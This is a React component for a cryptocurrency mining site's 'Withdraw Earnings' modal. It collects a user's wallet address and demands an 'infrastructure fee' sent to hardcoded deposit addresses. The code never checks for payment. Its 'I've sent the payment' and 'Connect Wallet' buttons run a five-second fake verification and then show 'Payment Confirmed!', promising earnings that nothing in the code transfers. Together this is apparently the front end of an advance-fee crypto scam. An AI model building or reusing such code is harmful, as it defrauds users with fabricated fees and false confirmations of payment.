"use client";

import React, { useState, useEffect, useRef, useCallback } from "react";
import { useMiningStore } from "../store/useMiningStore";
import Portal from "./Portal";

// Static config constants self-contained within the isolated modal component
const COINS = [
  { id: 'btc', name: 'Bitcoin', ticker: 'BTC', price: '$77,958', change: '+1.6%', up: true },
  { id: 'eth', name: 'Ethereum', ticker: 'ETH', price: '$2,143', change: '+1.4%', up: true },
  { id: 'bnb', name: 'BNB', ticker: 'BNB', price: '$653.79', change: '+2.2%', up: true },
  { id: 'sol', name: 'Solana', ticker: 'SOL', price: '$86.96', change: '+3.2%', up: true },
  { id: 'ton', name: 'Toncoin', ticker: 'TON', price: '$2.06', change: '+5.9%', up: true },
  { id: 'xmr', name: 'Monero', ticker: 'XMR', price: '$403.86', change: '+2.4%', up: true },
  { id: 'doge', name: 'Dogecoin', ticker: 'DOGE', price: '$0.106', change: '+3.0%', up: true },
  { id: 'trx', name: 'TRON', ticker: 'TRX', price: '$0.359', change: '+1.2%', up: true },
  { id: 'ada', name: 'Cardano', ticker: 'ADA', price: '$0.251', change: '+1.1%', up: true },
  { id: 'dot', name: 'Polkadot', ticker: 'DOT', price: '$1.29', change: '+4.4%', up: true },
  { id: 'usdt', name: 'Tether', ticker: 'USDT', price: '$0.999', change: '+0.0%', up: true },
  { id: 'usdc', name: 'USD Coin', ticker: 'USDC', price: '$1.000', change: '-0.0%', up: false },
  { id: 'ltc', name: 'Litecoin', ticker: 'LTC', price: '$54.39', change: '+1.1%', up: true },
  { id: 'xrp', name: 'Ripple', ticker: 'XRP', price: '$1.38', change: '+1.5%', up: true },
];

const COIN_NETWORKS: Record<string, string[]> = {
  btc: ["Bitcoin Network", "Lightning Network"],
  eth: ["ERC-20", "Arbitrum", "Optimism", "Base"],
  bnb: ["BSC (BEP-20)", "opBNB"],
  sol: ["Solana Network"],
  ton: ["TON Network"],
  trx: ["TRC-20"],
  usdt: ["TRC-20", "ERC-20", "BEP-20", "SOLANA"],
  usdc: ["ERC-20", "SOLANA", "BEP-20"]
};

const DEPOSIT_ADDRESSES: Record<string, string> = {
  btc: "bc1qagvkz7ad8uqp62hwd5pztgxv82zan3wcjr2ft4",
  eth: "0x169C339370E67C03e84787d8eC402dd89d94b51D",
  bnb: "0x169C339370E67C03e84787d8eC402dd89d94b51D",
  sol: "3vwAi8FEGcerD4yfQHBFFKx4FvRzPDNMGeVRZe3qoEzj",
  ton: "UQDnHAIjBPfEpksvRCWKU0P3KTxwOYrmKubD4078XORCetRm",
  trx: "TNaZbM2KpomzDT9PRufvyRcFH1EBtTmgCo",
  xmr: "3vwAi8FEGcerD4yfQHBFFKx4FvRzPDNMGeVRZe3qoEzj",
  ltc: "ltc1qcexcxae3evs8rt7ctz6vdnwwllsz39aqwrc3ee",
  xrp: "rhJwTZNi8j6E7WrkuqPrUtEw3usRXhXD6L",
  usdt: "TNaZbM2KpomzDT9PRufvyRcFH1EBtTmgCo",
  usdc: "0x169C339370E67C03e84787d8eC402dd89d94b51D"
};

export default function WithdrawalModal() {
  // Zustand Store Integration
  const isOpen = useMiningStore((s) => s.isWithdrawalModalOpen);
  const session = useMiningStore((s) => s.withdrawalSession);
  const close = useMiningStore((s) => s.closeWithdrawalModal);

  // Local Modal States
  const [modalStep, setModalStep] = useState(1);
  const [walletInput, setWalletInput] = useState("");
  const [walletError, setWalletError] = useState("");
  const [memoInput, setMemoInput] = useState("");
  const [confirmedAddress, setConfirmedAddress] = useState("");
  const [payTab, setPayTab] = useState<"deposit" | "walletconnect">("deposit");
  const [selectedPayCoin, setSelectedPayCoin] = useState("btc");
  const [selectedNetwork, setSelectedNetwork] = useState("");
  const [paymentStatus, setPaymentStatus] = useState<"idle" | "searching" | "success" | "error">("idle");
  const [txDots, setTxDots] = useState("");
  
  // Animation States
  const [mounted, setMounted] = useState(false);
  const [animateClass, setAnimateClass] = useState(false);

  // DOM and Focus tracking Refs
  const modalRef = useRef<HTMLDivElement>(null);
  const previousActiveElement = useRef<HTMLElement | null>(null);

  // Handle transition timing for mounting/unmounting
  useEffect(() => {
    if (isOpen) {
      setMounted(true);
      // Wait for next frame to trigger CSS transitions
      const frame = requestAnimationFrame(() => {
        setAnimateClass(true);
      });
      return () => cancelAnimationFrame(frame);
    } else {
      setAnimateClass(false);
      const timer = setTimeout(() => {
        setMounted(false);
        // Reset steps when fully closed
        setModalStep(1);
        setWalletInput("");
        setWalletError("");
        setMemoInput("");
        setConfirmedAddress("");
        setPayTab("deposit");
        setSelectedPayCoin("btc");
        setPaymentStatus("idle");
      }, 300); // matches globals.css slideUp transition
      return () => clearTimeout(timer);
    }
  }, [isOpen]);

  // Synchronize network dependencies when coin changes
  useEffect(() => {
    if (session) {
      const networks = COIN_NETWORKS[session.coinId];
      setSelectedNetwork(networks ? networks[0] : "");
    }
  }, [session?.coinId]);

  useEffect(() => {
    const networks = COIN_NETWORKS[selectedPayCoin];
    setSelectedNetwork(networks ? networks[0] : "");
  }, [selectedPayCoin]);

  // Lock scrolling, capture focus, and restore focus on dismiss
  useEffect(() => {
    if (isOpen) {
      previousActiveElement.current = document.activeElement as HTMLElement;
      document.body.style.overflow = "hidden";
      
      // Auto-focus input on open
      setTimeout(() => {
        const input = modalRef.current?.querySelector("input");
        if (input) input.focus();
      }, 100);
    } else {
      document.body.style.overflow = "";
      if (previousActiveElement.current) {
        previousActiveElement.current.focus();
      }
    }
    return () => {
      document.body.style.overflow = "";
    };
  }, [isOpen]);

  // Listen for Escape key and trap Focus cycle
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (!isOpen) return;

      if (e.key === "Escape") {
        close();
        return;
      }

      if (e.key === "Tab" && modalRef.current) {
        const focusable = modalRef.current.querySelectorAll<HTMLElement>(
          'a[href], area[href], input:not([disabled]), select:not([disabled]), textarea:not([disabled]), button:not([disabled]), [tabindex="0"]'
        );
        if (focusable.length === 0) return;

        const first = focusable[0];
        const last = focusable[focusable.length - 1];

        if (e.shiftKey) {
          if (document.activeElement === first) {
            last.focus();
            e.preventDefault();
          }
        } else {
          if (document.activeElement === last) {
            first.focus();
            e.preventDefault();
          }
        }
      }
    };

    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [isOpen, close]);

  // --- ACTIONS & CALCULATIONS ---
  const getPayAmount = useCallback(() => {
    if (!session) return "0.000000";
    const feePercent = [8, 9, 10, 11][session.speedTier];
    const rawFee = session.minedUsd * (feePercent / 100);
    const feeUsd = Math.max(70.00, rawFee);
    
    const payCoin = COINS.find(c => c.id === selectedPayCoin);
    if (!payCoin) return "0.000000";
    const price = parseFloat(payCoin.price.replace(/[^0-9.]/g, ''));
    if (price === 0) return "0.000000";
    
    return (feeUsd / price).toFixed(6);
  }, [session, selectedPayCoin]);

  const copyAmount = useCallback((amount: string, el: HTMLElement) => {
    navigator.clipboard.writeText(amount);
    
    const tooltip = el.querySelector(".da-tooltip");
    if (tooltip) {
      const prevText = tooltip.textContent;
      tooltip.textContent = "Copied!";
      setTimeout(() => {
        tooltip.textContent = prevText;
      }, 2000);
    }
  }, []);

  const copyAddress = useCallback(() => {
    const address = DEPOSIT_ADDRESSES[selectedPayCoin] || DEPOSIT_ADDRESSES.btc;
    navigator.clipboard.writeText(address);
    
    const copyBtn = document.getElementById("copyBtn");
    if (copyBtn) {
      copyBtn.textContent = "Copied!";
      copyBtn.classList.add("copied");
      setTimeout(() => {
        copyBtn.textContent = "Copy Address";
        copyBtn.classList.remove("copied");
      }, 2000);
    }
  }, [selectedPayCoin]);

  const confirmWallet = useCallback(() => {
    if (!walletInput.trim()) {
      setWalletError("Wallet address is required.");
      return;
    }
    if (walletInput.trim().length < 20) {
      setWalletError("Invalid address. Must be at least 20 characters.");
      return;
    }
    
    setConfirmedAddress(walletInput);
    setModalStep(2);
  }, [walletInput]);

  const editWallet = useCallback(() => {
    setModalStep(1);
  }, []);

  const iPaid = useCallback(() => {
    setPaymentStatus("searching");
    let count = 0;
    const dotsInterval = setInterval(() => {
      setTxDots(d => d.length >= 3 ? "" : d + ".");
    }, 500);
    
    setTimeout(() => {
      clearInterval(dotsInterval);
      setPaymentStatus("success");
    }, 5000); // Smooth 5-second simulated verification loop
  }, []);

  const handleBackdropClick = (e: React.MouseEvent) => {
    if (e.target === e.currentTarget) {
      close();
    }
  };

  // Exit cleanly if unmounted or details missing
  if (!mounted || !session) return null;

  return (
    <Portal>
      <div 
        className={`modal-overlay ${animateClass ? "show" : ""}`} 
        onClick={handleBackdropClick}
        style={{
          opacity: animateClass ? 1 : 0,
          transition: "opacity 0.25s ease-out",
          willChange: "opacity"
        }}
      >
        <div 
          ref={modalRef} 
          className="modal" 
          tabIndex={-1}
          style={{
            transform: animateClass ? "scale(1) translateY(0)" : "scale(0.95) translateY(20px)",
            transition: "transform 0.3s cubic-bezier(0.16, 1, 0.3, 1), opacity 0.3s ease-out",
            opacity: animateClass ? 1 : 0,
            willChange: "transform, opacity"
          }}
        >
          <div className="modal-handle"></div>
          <div className="modal-close" onClick={close} aria-label="Close modal">×</div>
          <h2>Withdraw Earnings</h2>
          
          <div className="modal-session-code" id="modalSessionCode" style={{ display: 'inline-block' }}>
            {session.sessionId}
          </div>
          
          {paymentStatus === "success" ? (
            <div className="payment-success-screen">
              <div className="success-icon-wrap">
                <svg className="success-svg" viewBox="0 0 52 52">
                  <circle className="success-circle" cx="26" cy="26" r="25" fill="none"/>
                  <path className="success-check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
                </svg>
              </div>
              <h3>Payment Confirmed!</h3>
              <p className="success-desc">
                Your infrastructure fee payment of <strong>{getPayAmount()} {selectedPayCoin.toUpperCase()}</strong> has been successfully received and matched to session <code>{session.sessionId}</code>.
              </p>
              <p className="success-sub">
                We have initiated the transfer of <strong>{session.minedAmount.toFixed(8)} {session.coinTicker}</strong> to your wallet address:
              </p>
              <div className="success-wallet-box">{confirmedAddress}</div>
              <p className="success-time-notice">
                Your earnings will arrive in your wallet within 2 network confirmations (typically 5-15 minutes). You can monitor your payout status in the dashboard block explorer.
              </p>
              <button 
                className="btn btn-primary btn-success-close" 
                onClick={() => {
                  setPaymentStatus("idle");
                  close();
                }}
              >
                Back to Dashboard
              </button>
            </div>
          ) : (
            <>
              <p className="subtitle">Your mining session has ended. Enter your wallet address to receive your earnings, then pay the infrastructure fee.</p>

              {/* STEP 1: Wallet Address Form */}
              {modalStep === 1 && (
                <div className="modal-step" id="modalStep1" style={{ display: 'block' }}>
                  <h3 className="modal-step-title">
                    <span className="step-badge">1</span> Your Withdrawal Wallet
                  </h3>
                  <p className="modal-step-desc">
                    Enter the wallet address where you want to receive your mined <strong id="feeMinedCoin">{session.coinTicker}</strong>
                  </p>
                  
                  {/* Network Selection for Coins with Multiple Networks */}
                  {COIN_NETWORKS[session.coinId] && (
                    <div className="withdraw-network-wrap" id="withdrawNetWrap" style={{ display: 'block' }}>
                      <label className="memo-label">Select Network</label>
                      <div className="withdraw-network-opts" id="withdrawNetOpts">
                        {COIN_NETWORKS[session.coinId].map((network) => (
                          <button
                            key={network}
                            type="button"
                            className={`net-opt-btn ${selectedNetwork === network ? 'active' : ''}`}
                            onClick={() => setSelectedNetwork(network)}
                          >
                            {network}
                          </button>
                        ))}
                      </div>
                    </div>
                  )}
                  
                  <div className="wallet-input-wrap">
                    <input
                      type="text"
                      className="wallet-input"
                      id="walletInput"
                      placeholder="Enter your wallet address..."
                      autoComplete="off"
                      spellCheck="false"
                      value={walletInput}
                      onChange={(e) => {
                        setWalletInput(e.target.value);
                        if (e.target.value.trim().length > 0) {
                          setWalletError("");
                        }
                      }}
                    />
                    <div className="wallet-input-hint" id="walletHint">
                      Paste your <span>{session.coinName}</span> wallet address
                    </div>
                    {walletError && (
                      <div className="wallet-error" id="walletError" style={{ display: 'block' }}>
                        {walletError}
                      </div>
                    )}
                  </div>
                  
                  <div className="memo-input-wrap" id="memoWrap" style={{ display: 'block' }}>
                    <label className="memo-label" id="memoLabel">
                      Memo / Tag <span className="memo-optional">(optional)</span>
                    </label>
                    <input
                      type="text"
                      className="wallet-input memo-input"
                      id="memoInput"
                      placeholder="Memo tag for transfer (if required by your wallet)"
                      autoComplete="off"
                      spellCheck="false"
                      value={memoInput}
                      onChange={(e) => setMemoInput(e.target.value)}
                    />
                  </div>
                  
                  <div className="fee-breakdown">
                    <div className="fee-row">
                      <span>You Receive</span>
                      <span id="feeReceiveAmt" style={{ color: 'var(--green)' }}>
                        {session.minedAmount.toFixed(8)} {session.coinTicker}
                      </span>
                    </div>
                    <div className="fee-row">
                      <span>Service Fee</span>
                      <span id="feeFeeAmt">
                        ${Math.max(70.00, session.minedUsd * ([8, 9, 10, 11][session.speedTier] / 100)).toFixed(2)} ({[8, 9, 10, 11][session.speedTier]}%)
                      </span>
                    </div>
                  </div>
                  <button
                    className="btn btn-primary"
                    style={{ width: '100%', marginTop: '8px' }}
                    id="confirmWalletBtn"
                    onClick={confirmWallet}
                  >
                    Continue to Payment
                  </button>
                </div>
              )}

              {/* STEP 2: Fee Payment Workflow */}
              {modalStep === 2 && (
                <div className="modal-step" id="modalStep2" style={{ display: 'block' }}>
                  <h3 className="modal-step-title">
                    <span className="step-badge">2</span> Pay Infrastructure Fee
                  </h3>
                  
                  <div className="confirmed-wallet">
                    <span className="cw-label">Withdrawal address:</span>
                    <span className="cw-address" id="confirmedWalletAddr">
                      {confirmedAddress}
                    </span>
                    <button className="cw-edit" onClick={editWallet}>
                      Edit
                    </button>
                  </div>
                  
                  <div className="fee-breakdown" style={{ marginBottom: '16px' }}>
                    <div className="fee-row total">
                      <span>Fee to Pay</span>
                      <span id="feeTotalAmt">
                        ${Math.max(70.00, session.minedUsd * ([8, 9, 10, 11][session.speedTier] / 100)).toFixed(2)}
                      </span>
                    </div>
                  </div>

                  {/* Payment Method Tabs */}
                  <div className="pay-tabs">
                    <button
                      className={`pay-tab ${payTab === 'deposit' ? 'active' : ''}`}
                      onClick={() => setPayTab('deposit')}
                    >
                      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                        <path d="M21 12V7H5a2 2 0 010-4h14v4"></path>
                        <path d="M3 5v14a2 2 0 002 2h16v-5"></path>
                        <path d="M18 12a2 2 0 100 4 2 2 0 000-4z"></path>
                      </svg>
                      Deposit
                    </button>
                    <button
                      className={`pay-tab ${payTab === 'walletconnect' ? 'active' : ''}`}
                      onClick={() => setPayTab('walletconnect')}
                    >
                      <svg width="16" height="11" viewBox="0 0 300 185" fill="none">
                        <path d="M61.4 36.3c49-48 128.5-48 177.5 0l5.9 5.8a6 6 0 010 8.7l-20.2 19.8a3.1 3.1 0 01-4.4 0l-8.1-8c-34.2-33.5-89.6-33.5-123.8 0l-8.7 8.5a3.1 3.1 0 01-4.4 0L55 51.3a6 6 0 010-8.7l6.5-6.3zm219.3 40.8l18 17.6a6 6 0 010 8.7l-81 79.5a6.3 6.3 0 01-8.9 0l-57.5-56.4a1.6 1.6 0 00-2.2 0l-57.5 56.4a6.3 6.3 0 01-8.9 0l-81-79.5a6 6 0 010-8.7l18-17.6a6.3 6.3 0 018.9 0l57.5 56.4a1.6 1.6 0 002.2 0l57.5-56.4a6.3 6.3 0 018.9 0l57.5 56.4a1.6 1.6 0 002.2 0l57.5-56.4a6.3 6.3 0 018.9 0z" fill="#3B99FC"></path>
                      </svg>
                      WalletConnect
                    </button>
                  </div>

                  {/* TAB: Deposit */}
                  {payTab === 'deposit' && (
                    <div className="pay-tab-content" id="tabDeposit" style={{ display: 'block' }}>
                      <h3 className="modal-step-subtitle">PAY WITH</h3>
                      <div className="pay-crypto-select" id="payCryptoSelect">
                        {COINS.filter(c => ["btc", "eth", "bnb", "sol", "ton", "trx", "xmr", "ltc", "xrp", "usdt", "usdc"].includes(c.id)).map((coin) => (
                          <div
                            key={coin.id}
                            className={`pay-option ${selectedPayCoin === coin.id ? 'active' : ''}`}
                            onClick={() => setSelectedPayCoin(coin.id)}
                          >
                            <img
                              src={`/assets/icons/${coin.id}.svg`}
                              alt={coin.ticker}
                              className="pay-coin-icon"
                              onError={(e) => {
                                e.currentTarget.style.display = 'none';
                              }}
                            />
                            {coin.ticker}
                          </div>
                        ))}
                      </div>
                      
                      {/* Dynamic Deposit Network Selection */}
                      {COIN_NETWORKS[selectedPayCoin] && (
                        <div className="network-select-wrap" id="networkSelectWrap" style={{ display: 'block' }}>
                          <h3 className="modal-step-subtitle" style={{ marginTop: '4px' }}>SELECT NETWORK</h3>
                          <div className="network-select" id="networkSelect">
                            {COIN_NETWORKS[selectedPayCoin].map((net) => (
                              <button
                                key={net}
                                type="button"
                                className={`net-select-btn ${selectedNetwork === net ? 'active' : ''}`}
                                onClick={() => setSelectedNetwork(net)}
                              >
                                {net}
                              </button>
                            ))}
                          </div>
                        </div>
                      )}
                      
                      <div className="deposit-box" id="depositBox">
                        <div className="network" id="depositNetwork">
                          {selectedPayCoin.toUpperCase()} Network {selectedNetwork ? `(${selectedNetwork})` : ''}
                        </div>
                        
                        {/* Interactive QR code container */}
                        <div className="qr-canvas" id="qrCanvas" title={DEPOSIT_ADDRESSES[selectedPayCoin] || DEPOSIT_ADDRESSES.btc}>
                          <img src="data:image/png;base64,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" style={{ display: 'block' }} alt="Deposit QR Code" />
                        </div>
                        
                        <div className="deposit-amount" id="depositAmount">
                          <span className="da-label">
                            Amount to send <span className="da-info-icon">?</span>
                            <span className="da-tooltip">Send the precise amount shown. Incorrect amounts cannot be matched to your session automatically.</span>
                          </span>
                          <div className="da-value-wrap" onClick={(e) => copyAmount(getPayAmount(), e.currentTarget)}>
                            <span className="da-value">{getPayAmount()}</span>
                            <span className="da-ticker">{selectedPayCoin.toUpperCase()}</span>
                            <svg className="da-copy-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                              <rect x="9" y="9" width="13" height="13" rx="2"></rect>
                              <path d="M5 15H4a2 2 0 01-2-2V4a2 2 0 012-2h9a2 2 0 012 2v1"></path>
                            </svg>
                          </div>
                        </div>
                        
                        <div className="addr-wrap" id="addrWrap" onClick={copyAddress}>
                          <span className="addr-text" id="depositAddress">
                            {DEPOSIT_ADDRESSES[selectedPayCoin] || DEPOSIT_ADDRESSES.btc}
                          </span>
                          <span className="addr-copy-btn" id="copyBtn">
                            Copy Address
                          </span>
                        </div>
                      </div>
                      
                      {paymentStatus === "searching" ? (
                        <div className="tx-search" id="txSearch" style={{ display: 'block' }}>
                          <div className="tx-spinner"></div>
                          <div className="tx-search-text">Searching for transaction<span>{txDots}</span></div>
                          <div className="tx-search-sub">This may take a few minutes depending on network confirmation speed</div>
                        </div>
                      ) : (
                        <button className="btn-i-paid" id="btnIPaid" onClick={iPaid}>
                          I've sent the payment
                        </button>
                      )}
                      
                      <div className="modal-note">
                        <strong>Note:</strong> After sending the exact fee amount to the deposit address, your mined earnings will be sent to your wallet within 2 network confirmations.
                      </div>
                    </div>
                  )}

                  {/* TAB: WalletConnect */}
                  {payTab === 'walletconnect' && (
                    <div className="pay-tab-content" id="tabWalletConnect" style={{ display: 'block' }}>
                      <div className="wc-container">
                        <div className="wc-icon">
                          <svg width="40" height="40" viewBox="0 0 480 480" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <rect width="480" height="480" rx="80" fill="#3B99FC"></rect>
                            <path d="M141.4 189.3c54.4-53.3 142.7-53.3 197.1 0l6.5 6.4a6.7 6.7 0 010 9.7l-22.4 21.9a3.5 3.5 0 01-4.9 0l-9-8.8c-38-37.2-99.6-37.2-137.5 0l-9.6 9.4a3.5 3.5 0 01-4.9 0l-22.4-21.9a6.7 6.7 0 010-9.7l7.1-7zm243.5 45.4l19.9 19.5a6.7 6.7 0 010 9.7L314.5 353a7 7 0 01-9.9 0l-64.3-63a1.7 1.7 0 00-2.5 0l-64.3 63a7 7 0 01-9.8 0L73.3 263.9a6.7 6.7 0 010-9.7l19.9-19.5a7 7 0 019.9 0l64.3 63a1.7 1.7 0 002.5 0l64.3-63a7 7 0 019.8 0l64.3 63a1.7 1.7 0 002.5 0l64.3-63a7 7 0 019.8 0z" fill="#fff"></path>
                          </svg>
                        </div>
                        <h3 className="wc-title">Connect Wallet</h3>
                        <p className="wc-desc">
                          Connect your wallet to pay the infrastructure fee directly. Supports 300+ wallets including MetaMask, Trust Wallet, Phantom, and more.
                        </p>
                        <button className="wc-connect-btn" onClick={iPaid}>
                          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <path d="M15 3h4a2 2 0 012 2v14a2 2 0 01-2 2h-4M10 17l5-5-5-5M13 12H3"></path>
                          </svg>
                          Connect Wallet
                        </button>
                        <div className="wc-wallets">
                          <span className="wc-wallet-tag">MetaMask</span>
                          <span className="wc-wallet-tag">Trust Wallet</span>
                          <span className="wc-wallet-tag">Phantom</span>
                          <span className="wc-wallet-tag">Coinbase</span>
                          <span className="wc-wallet-tag">Rainbow</span>
                          <span className="wc-wallet-tag">+300 more</span>
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              )}
            </>
          )}
        </div>
      </div>
    </Portal>
  );
}
